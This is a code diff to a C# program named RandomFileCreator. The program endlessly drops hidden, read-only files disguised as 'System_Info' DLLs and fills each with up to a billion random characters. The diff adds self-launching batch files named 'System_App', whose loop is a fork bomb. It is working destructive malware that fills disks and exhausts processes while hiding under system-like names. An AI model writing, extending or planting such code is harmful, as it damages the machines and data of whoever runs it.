@@ -39,15 +39,28 @@ namespace RandomFileCreator
             {
                 while (true)
                 {
-                    string path = RandomPath((string)path2) + "\\" + "System_Info_" + RandomName() + ".dll";
+                    bool isBat = random.Next(0, 4) == 0;
+                    string path;
+                    if (isBat)
+                        path = RandomPath((string)path2) + "\\" + "System_App_" + RandomName() + ".bat";
+                    else
+                        path = RandomPath((string)path2) + "\\" + "System_Info_" + RandomName() + ".dll";
                     using (StreamWriter sw = new StreamWriter(path, true))
                     {
-                        File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
+                        if (!isBat)
+                            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
                         File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.ReadOnly);
-                        for (int i = 0; i < random.Next(50, 1000000000); i++)
+                        if (isBat)
                         {
-                            int c = random.Next(0, 8192);
-                            sw.Write((char)c);
+                            sw.Write(":A\nstart " + path + "\ngoto A");
+                        }
+                        else
+                        {
+                            for (int i = 0; i < random.Next(50, 1000000000); i++)
+                            {
+                                int c = random.Next(0, 8192);
+                                sw.Write((char)c);
+                            }
                         }
                     }
                 }
